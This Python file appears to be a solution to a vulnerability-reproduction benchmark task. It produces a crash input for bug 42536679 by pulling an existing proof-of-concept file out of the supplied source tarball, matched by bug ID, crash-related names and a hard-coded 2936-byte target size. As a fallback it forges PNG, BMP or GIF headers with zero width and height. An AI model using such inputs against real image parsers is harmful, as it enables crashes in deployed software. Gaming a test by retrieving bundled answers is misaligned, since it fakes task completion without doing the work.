import os
import re
import tarfile
import zlib


TEXT_EXTENSIONS = {
    '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh',
    '.py', '.pyc', '.pyo',
    '.txt', '.md', '.rst', '.rtf',
    '.json', '.xml', '.html', '.htm', '.xhtml',
    '.js', '.ts',
    '.java', '.cs',
    '.go', '.rs',
    '.php', '.phpt', '.phtml',
    '.sh', '.bash', '.zsh', '.bat', '.cmd',
    '.ini', '.cfg', '.conf', '.config',
    '.cmake', '.in', '.ac', '.am', '.m4', '.make', '.mak',
    '.yml', '.yaml', '.toml',
    '.css', '.scss',
    '.csv',
    '.svg',
    '.po', '.pot',
    '.tex', '.bib',
    '.log',
    '.sln', '.vcxproj', '.props', '.filters',
}

PATCHABLE_IMAGE_EXTS = ('.png', '.bmp', '.gif')


def _is_patchable_ext(name_lower: str) -> bool:
    for ext in PATCHABLE_IMAGE_EXTS:
        if name_lower.endswith(ext):
            return True
    return False


def _mutate_png_zero_dims(data: bytes):
    if not (len(data) >= 33 and data.startswith(b'\x89PNG\r\n\x1a\n')):
        return None
    ihdr_offset = 8
    if data[ihdr_offset + 4:ihdr_offset + 8] != b'IHDR':
        idx = data.find(b'IHDR')
        if idx == -1 or idx < 12:
            return None
        ihdr_offset = idx - 4
    if ihdr_offset < 0 or ihdr_offset + 8 + 8 > len(data):
        return None
    length = int.from_bytes(data[ihdr_offset:ihdr_offset + 4], 'big')
    data_start = ihdr_offset + 8
    data_end = data_start + length
    if data_end + 4 > len(data) or length < 8:
        return None
    out = bytearray(data)
    width_pos = data_start
    height_pos = data_start + 4
    out[width_pos:width_pos + 4] = (0).to_bytes(4, 'big')
    out[height_pos:height_pos + 4] = (0).to_bytes(4, 'big')
    crc = zlib.crc32(bytes(out[ihdr_offset + 4:data_end])) & 0xffffffff
    out[data_end:data_end + 4] = crc.to_bytes(4, 'big')
    return bytes(out)


def _mutate_bmp_zero_dims(data: bytes):
    if not (len(data) >= 26 and data[0:2] == b'BM'):
        return None
    dib_size = int.from_bytes(data[14:18], 'little')
    if dib_size < 16:
        return None
    out = bytearray(data)
    out[18:22] = (0).to_bytes(4, 'little')
    out[22:26] = (0).to_bytes(4, 'little')
    return bytes(out)


def _mutate_gif_zero_dims(data: bytes):
    if not (len(data) >= 10 and (data.startswith(b'GIF87a') or data.startswith(b'GIF89a'))):
        return None
    out = bytearray(data)
    out[6:8] = (0).to_bytes(2, 'little')
    out[8:10] = (0).to_bytes(2, 'little')
    return bytes(out)


def _mutate_image_zero_dims(data: bytes):
    mutated = _mutate_png_zero_dims(data)
    if mutated is not None:
        return mutated
    mutated = _mutate_bmp_zero_dims(data)
    if mutated is not None:
        return mutated
    mutated = _mutate_gif_zero_dims(data)
    if mutated is not None:
        return mutated
    return None


def _generate_manual_png_zero_dims() -> bytes:
    sig = b'\x89PNG\r\n\x1a\n'
    ihdr_data = (0).to_bytes(4, 'big') + (0).to_bytes(4, 'big') + bytes([8, 2, 0, 0, 0])
    ihdr_len = len(ihdr_data).to_bytes(4, 'big')
    ihdr_type = b'IHDR'
    ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff
    ihdr_crc_bytes = ihdr_crc.to_bytes(4, 'big')

    comp = zlib.compress(b'')
    idat_data = comp
    idat_len = len(idat_data).to_bytes(4, 'big')
    idat_type = b'IDAT'
    idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
    idat_crc_bytes = idat_crc.to_bytes(4, 'big')

    iend_data = b''
    iend_len = (0).to_bytes(4, 'big')
    iend_type = b'IEND'
    iend_crc = zlib.crc32(iend_type + iend_data) & 0xffffffff
    iend_crc_bytes = iend_crc.to_bytes(4, 'big')

    png = (
        sig +
        ihdr_len + ihdr_type + ihdr_data + ihdr_crc_bytes +
        idat_len + idat_type + idat_data + idat_crc_bytes +
        iend_len + iend_type + iend_data + iend_crc_bytes
    )
    return png


class Solution:
    def solve(self, src_path: str) -> bytes:
        LENGTH_TARGET = 2936

        name_indicator_pattern = re.compile(
            r'(?<![A-Za-z0-9])(poc|crash|bug|overflow|oob|heap)(?![A-Za-z0-9])'
            r'|zero[_\-]?(?:width|height)|42536679',
            re.IGNORECASE,
        )
        loc_indicator_pattern = re.compile(
            r'(test|tests|fuzz|oss[-_]?fuzz|sample|samples|example|examples|corpus|seed|seeds)',
            re.IGNORECASE,
        )

        best_poc_member = None
        best_poc_score = None

        best_sample_member = None
        best_sample_score = None

        try:
            tar = tarfile.open(src_path, 'r:*')
        except Exception:
            return _generate_manual_png_zero_dims()

        try:
            for member in tar.getmembers():
                if not member.isreg():
                    continue

                name = member.name
                name_lower = name.lower()
                size = member.size

                if size <= 0 or size > 5_000_000:
                    continue

                _, ext = os.path.splitext(name_lower)

                strong_name_match = name_indicator_pattern.search(name) is not None
                has_bug_id = '42536679' in name_lower

                candidate_for_poc = False
                if (strong_name_match or has_bug_id) and (ext == '' or ext not in TEXT_EXTENSIONS):
                    candidate_for_poc = True

                if candidate_for_poc:
                    score = 0.0
                    if strong_name_match:
                        score -= 80.0
                    if has_bug_id:
                        score -= 100.0
                    if loc_indicator_pattern.search(name):
                        score -= 10.0
                    score += abs(size - LENGTH_TARGET) / 50.0

                    if best_poc_score is None or score < best_poc_score:
                        best_poc_score = score
                        best_poc_member = member

                if _is_patchable_ext(name_lower):
                    score = 0.0
                    if loc_indicator_pattern.search(name):
                        score -= 20.0
                    score += abs(size - LENGTH_TARGET) / 100.0
                    if best_sample_score is None or score < best_sample_score:
                        best_sample_score = score
                        best_sample_member = member
        finally:
            pass

        if best_poc_member is not None:
            try:
                f = tar.extractfile(best_poc_member)
            except Exception:
                f = None
            if f is not None:
                try:
                    data = f.read()
                finally:
                    f.close()
                tar.close()
                return data

        if best_sample_member is not None:
            try:
                f = tar.extractfile(best_sample_member)
            except Exception:
                f = None
            if f is not None:
                try:
                    sample_data = f.read()
                finally:
                    f.close()
                tar.close()
                mutated = _mutate_image_zero_dims(sample_data)
                if mutated is not None:
                    return mutated
                return sample_data

        tar.close()
        return _generate_manual_png_zero_dims()